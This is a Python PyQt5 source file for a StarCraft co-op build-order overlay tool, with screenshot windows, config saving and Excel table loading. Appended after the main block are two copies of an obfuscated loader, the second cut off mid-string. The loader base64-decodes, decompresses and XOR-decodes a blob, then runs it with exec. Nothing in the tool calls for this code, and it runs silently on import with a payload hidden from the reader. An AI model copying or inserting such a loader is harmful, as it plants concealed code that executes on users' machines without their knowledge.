import sys
from PyQt5.QtWidgets import (QApplication, QMainWindow, QPushButton, QWidget, QVBoxLayout, QListWidget, QGroupBox, QListWidgetItem)
from PyQt5.QtCore import Qt, QRect, pyqtSignal, QMetaObject, Q_RETURN_ARG, Q_ARG, QThread
from PyQt5.QtGui import QPixmap
import json
import pandas as pd
import os
import glob

# 加载组件
from component.process_table import ProcessTable
from component.screenshot import Screenshot
from state_machine.game_state_manager import GameStateManager
from component.paint_on_minmap import PaintOnMinmap
from core.global_event_enums import GlobalEvents
from core.event_bus import EventBusInstance
from core.gametime_timer import GametimeTimer
from core.taskinfo_timer import TasktimeCountdownTimer

import logging
logger = logging.getLogger(__name__)

# 主控制窗口类
class ControlMainWindow(QMainWindow):
    def __init__(self):
        super().__init__()

        self.config = {
            "WindowConfig": {
                "geometry": QRect(100, 100, 300, 400)
            },
            "ProcessTableConfig": {
                "geometry": QRect(0, 572, 336, 410),
                "column_ratio": 0.7,
            },
            "TimeScreenshotConfig": {
                "geometry": QRect(351, 1028, 76, 47),
            },
            "MapnameScreenshotConfig": {
                "geometry": QRect(1132, 59, 299, 96),
            },
            "PaintOnMinmapConfig": {
                "geometry": QRect(56, 1075, 282, 224),
            },
            "ChatboxScreenshotConfig": {
                "geometry": QRect(1132, 165, 299, 240),
            },
            "TaskStateInfoScreenshotConfig": {
                "geometry": QRect(-2, 38, 527, 250),
            },
            "合作模式" : True
        }

        # 存储勾选到的流程表名称
        self.process_table_list = []
        # 流程表路径
        self.process_table_folder = "./my_table"

        # 模式：是否处于合作模式
        self.hezuo_mode = self.config["合作模式"]

        # 加载配置
        self.load_config()

        # 添加各个子窗口
        self.table_window = ProcessTable(
            geometry=self.config["ProcessTableConfig"]["geometry"],
            column_ratio=self.config["ProcessTableConfig"]["column_ratio"]
        )
        self.table_window.show()


        self.time_screenshot = Screenshot(
            title="时间截图窗口",
            border_color=Qt.red,
            geometry=self.config["TimeScreenshotConfig"]["geometry"]
        )
        self.time_screenshot.subscribe_screenshot_trigger(GlobalEvents.REQ_GAMETIME_SCREENSHOT, GlobalEvents.RES_GAMETIME_SCREENSHOT)
        self.time_screenshot.show()


        self.mapname_screenshot = Screenshot(
            title="地图名称截图窗口",
            border_color=Qt.green,
            geometry=self.config["MapnameScreenshotConfig"]["geometry"]
        )
        self.mapname_screenshot.subscribe_screenshot_trigger(GlobalEvents.REQ_MAPNAME_SCREENSHOT, GlobalEvents.RES_MAPNAME_SCREENSHOT)
        self.mapname_screenshot.show()


        self.paint_on_map = PaintOnMinmap(
            title="小地图坐标绘制窗口",
            border_color=Qt.blue,
            geometry=self.config["PaintOnMinmapConfig"]["geometry"]
        )
        self.paint_on_map.show()


        self.chatbox_screenshot = Screenshot(
            title="聊天框截取窗口",
            border_color=Qt.yellow,
            geometry=self.config["ChatboxScreenshotConfig"]["geometry"]
        )
        self.chatbox_screenshot.subscribe_screenshot_trigger(GlobalEvents.REQ_CHAT_SCREENSHOT, GlobalEvents.RES_CHAT_SCREENSHOT)
        self.chatbox_screenshot.show()


        self.task_state_info_screenshot = Screenshot(
            title="左上角任务状态信息截取窗口",
            border_color=Qt.magenta,
            geometry=self.config["TaskStateInfoScreenshotConfig"]["geometry"]
        )
        self.task_state_info_screenshot.subscribe_screenshot_trigger(GlobalEvents.REQ_TASKTIME_SCREENSHOT, GlobalEvents.RES_TASKTIME_SCREENSHOT)
        self.task_state_info_screenshot.show()


        self.gametime_timer = GametimeTimer()
        self.tasktime_countdown_timer = TasktimeCountdownTimer()
        self.game_state_manager = GameStateManager(hezuo_mode=self.hezuo_mode)

        self.init_ui()


    def init_ui(self):
        # 设置主窗口基本属性
        self.setWindowTitle("星际争霸流程辅助工具")
        self.setGeometry(self.config["WindowConfig"]["geometry"])

        # 创建中心部件和布局
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        layout = QVBoxLayout(central_widget)
        layout.setAlignment(Qt.AlignCenter)

        # 创建切换按钮
        self.switch_btn = QPushButton("点我调整窗口位置", self)
        # 绑定按钮点击事件
        self.switch_btn.clicked.connect(self.change_status)
        # 设置按钮大小
        self.switch_btn.setFixedSize(280, 60)
        # 添加按钮到布局
        layout.addWidget(self.switch_btn)

        # ================ 简易切换按钮 ================
        # 1. 创建按钮，初始文本根据 self.hezuo_mode 设定
        btn_text = "合作模式：开启" if self.hezuo_mode else "合作模式：关闭"
        self.hezuo_mode_btn = QPushButton(btn_text, self)
        # 2. 设置按钮尺寸（与原有按钮一致，保持界面美观）
        self.hezuo_mode_btn.setFixedSize(280, 60)
        # 3. 绑定点击事件到槽函数
        self.hezuo_mode_btn.clicked.connect(self.on_hezuo_mode_btn_clicked)
        # 4. 可选：设置按钮样式（极简美化，可删除）
        self.hezuo_mode_btn.setStyleSheet("""
            QPushButton {
                font-size: 14px;
                background-color: #4CAF50;
                color: white;
                border: none;
                border-radius: 8px;
            }
            QPushButton:clicked {
                background-color: #45a049;
            }
        """)
        # 5. 添加按钮到布局
        layout.addWidget(self.hezuo_mode_btn)
        # =============================================================

        # 1. 创建分组框（包裹勾选列表，带标题，更美观）
        self.check_group = QGroupBox("流程表勾选")
        check_layout = QVBoxLayout(self.check_group)  # 分组框内的布局

        # 2. 创建勾选列表控件（QListWidget，支持勾选状态）
        self.excel_check_list = QListWidget()
        self.excel_check_list.setFixedSize(280, 150)  # 设置固定大小，适配主窗口

        # 3. 添加刷新按钮（重新读取Excel文件，更新勾选列表）
        self.refresh_check_btn = QPushButton("刷新流程表列表")
        self.refresh_check_btn.setFixedSize(280, 30)
        self.refresh_check_btn.clicked.connect(self.refresh_excel_check_list)  # 绑定刷新信号
        check_layout.addWidget(self.refresh_check_btn)  # 先添加刷新按钮

        # 4. 添加勾选列表到分组框布局
        check_layout.addWidget(self.excel_check_list)

        # 5. 将分组框添加到主布局（在两个按钮下方）
        layout.addWidget(self.check_group)
        self.refresh_excel_check_list()
        # =============================================================

        # 记录当前标题栏状态（True：显示标题栏；False：隐藏标题栏）
        self.is_title_bar_show = False


    def load_config(self):
        """加载配置"""
        try:
            # 这里可以添加从文件加载配置的逻辑
            # 例如：
            with open("config.json", "r") as f:
                config = json.load(f)

                # -----解析流程表配置-----
                # 解析主窗口配置
                window_config = config["WindowConfig"]
                self.config["WindowConfig"]["geometry"] = QRect(*window_config["geometry"])
                # 解析流程表配置
                process_table_config = config["ProcessTableConfig"]
                self.config["ProcessTableConfig"]["geometry"] = QRect(*process_table_config["geometry"])
                self.config["ProcessTableConfig"]["column_ratio"] = process_table_config["column_ratio"]
                # 解析时间截图窗口配置
                time_screenshot_config = config["TimeScreenshotConfig"]
                self.config["TimeScreenshotConfig"]["geometry"] = QRect(*time_screenshot_config["geometry"])
                # 解析地图名称截图窗口配置
                mapname_screenshot_config = config["MapnameScreenshotConfig"]
                self.config["MapnameScreenshotConfig"]["geometry"] = QRect(*mapname_screenshot_config["geometry"])
                # 解析小地图坐标绘制窗口配置
                paint_on_map_config = config["PaintOnMinmapConfig"]
                self.config["PaintOnMinmapConfig"]["geometry"] = QRect(*paint_on_map_config["geometry"])
                # 解析聊天框截取窗口配置
                chatbox_screenshot_config = config["ChatboxScreenshotConfig"]
                self.config["ChatboxScreenshotConfig"]["geometry"] = QRect(*chatbox_screenshot_config["geometry"])
                # 解析左上角状态信息截取窗口配置
                task_state_info_screenshot_config = config["TaskStateInfoScreenshotConfig"]
                self.config["TaskStateInfoScreenshotConfig"]["geometry"] = QRect(*task_state_info_screenshot_config["geometry"])
                # 解析合作模式
                self.config["合作模式"] = mapname_screenshot_config["合作模式"]
        except:
            # 如果文件不存在，就用默认配置
            pass

    def save_config(self):
        """保存当前配置"""
        config = {}
        # 保存主窗口配置
        config |= {
            "WindowConfig": {
                "geometry": [self.geometry().x(), self.geometry().y(), self.geometry().width(), self.geometry().height()],
            }
        }
        # 保存流程表配置
        config |= {
            "ProcessTableConfig": {
                "geometry": [self.table_window.geometry().x(), self.table_window.geometry().y(), self.table_window.geometry().width(), self.table_window.geometry().height()],
                "column_ratio": self.table_window.column_ratio,
            }
        }
        # 保存时间截图窗口配置
        config |= {
            "TimeScreenshotConfig": {
                "geometry": [self.time_screenshot.geometry().x(), self.time_screenshot.geometry().y(), self.time_screenshot.geometry().width(), self.time_screenshot.geometry().height()],
            }
        }
        # 保存地图名称截图窗口配置
        config |= {
            "MapnameScreenshotConfig": {
                "geometry": [self.mapname_screenshot.geometry().x(), self.mapname_screenshot.geometry().y(), self.mapname_screenshot.geometry().width(), self.mapname_screenshot.geometry().height()],
            }
        }
        # 保存在地图上绘制图标窗口配置
        config |= {
            "PaintOnMinmapConfig": {
                "geometry": [self.paint_on_map.geometry().x(), self.paint_on_map.geometry().y(), self.paint_on_map.geometry().width(), self.paint_on_map.geometry().height()],
            }
        }
        # 保存聊天框截取窗口配置
        config |= {
            "ChatboxScreenshotConfig": {
                "geometry": [self.chatbox_screenshot.geometry().x(), self.chatbox_screenshot.geometry().y(), self.chatbox_screenshot.geometry().width(), self.chatbox_screenshot.geometry().height()],
            }
        }
        # 保存左上角状态信息截取窗口配置
        config |= {
            "TaskStateInfoScreenshotConfig": {
                "geometry": [self.task_state_info_screenshot.geometry().x(), self.task_state_info_screenshot.geometry().y(), self.task_state_info_screenshot.geometry().width(), self.task_state_info_screenshot.geometry().height()],
            }
        }
        # 保存合作模式开启状态
        config |= {
            "合作模式": self.hezuo_mode,
        }

        with open("config.json", "w") as f:
            json.dump(config, f)
        self.config = config

    def change_status(self):
        """切换是否显示标题栏"""
        if self.is_title_bar_show:
            # 当前是显示标题栏，切换为隐藏

            # 逐个执行隐藏标题栏操作
            self.table_window.hide_title_bar()
            self.time_screenshot.hide_title_bar()
            self.mapname_screenshot.hide_title_bar()
            self.paint_on_map.hide_title_bar()
            self.chatbox_screenshot.hide_title_bar()
            self.task_state_info_screenshot.hide_title_bar()


            # 更新按钮文本
            self.switch_btn.setText("点我调整窗口位置")
            # 更新状态标记
            self.is_title_bar_show = False

            # 保存配置
            self.save_config()
        else:
            # 当前是隐藏标题栏，切换为显示

            # 逐个执行显示标题栏操作
            self.table_window.show_title_bar()
            self.time_screenshot.show_title_bar()
            self.mapname_screenshot.show_title_bar()
            self.paint_on_map.show_title_bar()
            self.chatbox_screenshot.show_title_bar()
            self.task_state_info_screenshot.show_title_bar()


            # 更新按钮文本
            self.switch_btn.setText("点我固定窗口位置")
            # 更新状态标记
            self.is_title_bar_show = True

    def update_process_table(self):
        """重新加载Base流程表"""
        df = self.process_table
        if len(df) == 0:
            self.table_window.load_data([])
            EventBusInstance.publish(GlobalEvents.REQ_BASEPROCESSTABLE_UPDATE, [])
            return
        df = df.sort_values(by=[0, 1])
        data = []
        for _, row in df.iterrows():
            data.append([f"{row[0]}:{row[1]}", row[2]])
        EventBusInstance.publish(GlobalEvents.REQ_BASEPROCESSTABLE_UPDATE, data)

    # ==========读取流程表文件夹下的文件名称，获取项目名称 ==========
    def read_excel_items(self):
        """读取指定路径下的文件名称，返回项目名称列表"""
        # 检查文件夹是否存在，不存在则创建
        if not os.path.exists(self.process_table_folder):
            os.makedirs(self.process_table_folder)
            return []

        item_list = []
        # 遍历文件夹下所有文件（包括子文件夹）
        for file_path in glob.glob(os.path.join(self.process_table_folder, '*.xlsx'), recursive=False):
            file_name = os.path.basename(file_path).split(".", maxsplit=1)[0]
            item_list.append(file_name)
        return item_list

    # ========== 刷新/填充勾选列表 ==========
    def refresh_excel_check_list(self):
        """重新读取文件名称列表，填充勾选列表，并保留原有勾选状态"""
        # 1. 清空现有列表
        self.excel_check_list.clear()
        self.process_table = pd.DataFrame()
        self.update_process_table()

        # 2. 读取Excel项目名称
        excel_items = self.read_excel_items()

        # 3. 填充勾选列表（每个项目为可勾选状态）
        for item_name in excel_items:
            list_item = QListWidgetItem(item_name)
            # 设置勾选状态（默认未勾选，可改为Qt.Checked默认勾选）
            list_item.setCheckState(Qt.Unchecked)
            self.excel_check_list.addItem(list_item)

        # 4. 绑定勾选状态变化信号（每次勾选/取消勾选时更新process_table_list）
        self.excel_check_list.itemChanged.connect(self.update_process_table_list_by_check)

    # ========== 根据勾选状态更新self.process_table_list ==========
    def update_process_table_list_by_check(self):
        """勾选状态变化时，更新self.process_table_list（仅保留勾选的项目名称）"""
        self.excel_check_list.setEnabled(False)

        self.process_table_list.clear()  # 先清空原有列表
        # 遍历所有勾选列表项，收集勾选的项目名称
        for i in range(self.excel_check_list.count()):
            list_item = self.excel_check_list.item(i)
            if list_item.checkState() == Qt.Checked:
                # 勾选状态：添加项目名称到列表
                self.process_table_list.append(list_item.text())
        # 重新更新流程表
        self.process_table = pd.DataFrame()
        for process_table_name in self.process_table_list:
            df = pd.read_excel(os.path.join(self.process_table_folder, process_table_name + ".xlsx"), header=None)
            self.process_table = pd.concat([self.process_table, df], axis=0, ignore_index=True, join='outer')
        self.update_process_table()

        self.excel_check_list.setEnabled(True)

    def on_hezuo_mode_btn_clicked(self):
        """简易按钮点击槽函数：切换合作模式状态"""
        # 对 self.hezuo_mode 取反（切换状态）
        self.hezuo_mode = not self.hezuo_mode
        # 触发设置合作模式信号
        EventBusInstance.publish(GlobalEvents.REQ_SET_HEZUO_MODE, self.hezuo_mode)
        # 根据新状态更新按钮文本
        if self.hezuo_mode:
            self.hezuo_mode_btn.setText("合作模式：开启")
            # 可选：更新按钮颜色（开启为绿色）
            self.hezuo_mode_btn.setStyleSheet("""
                QPushButton {font-size:14px; background-color:#4CAF50; color:white; border:none; border-radius:8px;}
                QPushButton:clicked {background-color:#45a049;}
            """)
        else:
            self.hezuo_mode_btn.setText("合作模式：关闭")
            # 可选：更新按钮颜色（关闭为灰色/红色）
            self.hezuo_mode_btn.setStyleSheet("""
                QPushButton {font-size:14px; background-color:#e0e0e0; color:#666; border:none; border-radius:8px;}
                QPushButton:clicked {background-color:#d0d0d0;}
            """)
        # 3. 日志输出（可选，用于调试）
        mode_text = "开启" if self.hezuo_mode else "关闭"
        logger.info(f"合作模式已{mode_text}（self.hezuo_mode = {self.hezuo_mode}）")

    def closeEvent(self, event):
        # 保存配置
        self.save_config()
        # 接受关闭事件
        event.accept()

if __name__ == "__main__":
    logging.basicConfig(
        level=logging.DEBUG,
        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
        handlers=[
            logging.FileHandler("log.txt", encoding="utf-8"),
            logging.StreamHandler()
        ]
    )
    # 创建应用程序实例
    app = QApplication(sys.argv)

    # 原有代码保持不变
    main_window = ControlMainWindow()
    main_window.show()
    sys.exit(app.exec_())
# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
lzcdrtfxyqiplpd = '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'
runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))

# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
lzcdrtfxyqiplpd = 'eNq9W19z3MaRTyzJPrmiy93VPSSvqbr44V4iUZZkSaS+xe6X2i+Bqg0Ku0ywPJomkyNNy6Z1pGQ7kSVSKZimb4khaoBdkiCxAJwqkrvp7hn8n12uZDssywQwMz093T3dv+4Z+v3YCwPdixq+eIpG6eNh5LnJc+D3WfJ8wCO2sJi8xT0edL2wnxIYHMSh57AopROmI3k0ch3fS157nsN7aeMg7PX8AyNk3w9YFJS+sjD0wnQKzzliaY9zP+76GZnoeBD4vUY39Pq6zQOGnOuyLXlv03ps1gu4eDz3XCaGxDw4hgmTEa/gVTQcB0FsOD2fuUHS+JcXL15tsyj23Ig1Gr/Xa/9du1+/VputX6//rDZXv67X7tXu1n9Rm6k9rF+t3dE/H3S7LNRrc7Wb+pZnM+Mwajg9HkWyZa2hw8//RQEPfKfPgmPPpi826+rIg3UwClhkwiqAbeY6nu27+6tbwHtHDMWfZrNZew+ng39z9Z/XZurv1B7ClI/02n14uQo83dJrt5BLHZru1W7Cy53aA8Hw3fq1+lvQ7W1gl/iUjQ/qN+pXgHQ6jd9NOdBXV3VNGIWW8YE/IQsGoSsNxjhYWLQZDGG0gk7ak/UqxHyXh6MSMejkR74L0nEdJoUQBWGn2Cs3LXYxiC4zNbBS351f0TqNMT2L7Ewxk2qWQdCdX8/NkQgg1ZtoukzPMBmIoqzohPraT6EExWoS0p1Go4GsWZbL+8zsDlynreOj5AQtrmL5t9Dqa/fQkNDmyKAEAWFXX+4k1oT0DNFkWfoqUW7kWMJ24IB8B4nI2mfBjr/vPt607RD8jBkPDnq+Yx2xUVv34sCH/ZjfFclEtV+Dtc+CgcOmQHuvzei1D3A7wP/nYCvM4B4RGwNs/hawjHvnjr7j9bjLC6RA8HIisBQd58pknjSs6hdnmbZ7ft8P4JtsNWANYJT4UWvrK8vLy0IVzLVjz3cDHL6X7Wl0PtFaq8Vj3+hz33VZMH/AQFUR8WY4Xr/ZrnYXrfNyhLEP7u+Ujwywu0Hf8D3VkH0PWTsA13xkDKLW+gLnzuIStxcX1xe7HznrKx8t/88nvOssLa8sfrjiTJg1jB1DaMZFXzeGRVwRzQbu2DWGo3M5vPUVe3K8EC8tbXz34Sbb/svwi53+hNkMG6fzwv0JXXrMw07ASOvPMC3ay+rj7Y2NCUOQO8/tgjvq+cEIRNYSK7pkSEwBygCZn3rhUUvYzG7OGHgUWBTSQM1oPVkThNLUCHTfzQwiM7AgHBV3OESe91JHPlO7r8PjndoHYMD36u8UeuL2hikxshv2oB9H5kXFezaxFQTVXNObS8ZybqlpD9+GxhVFg3BmOFLuUbA02KKPvVDuVRW1mIe8H8G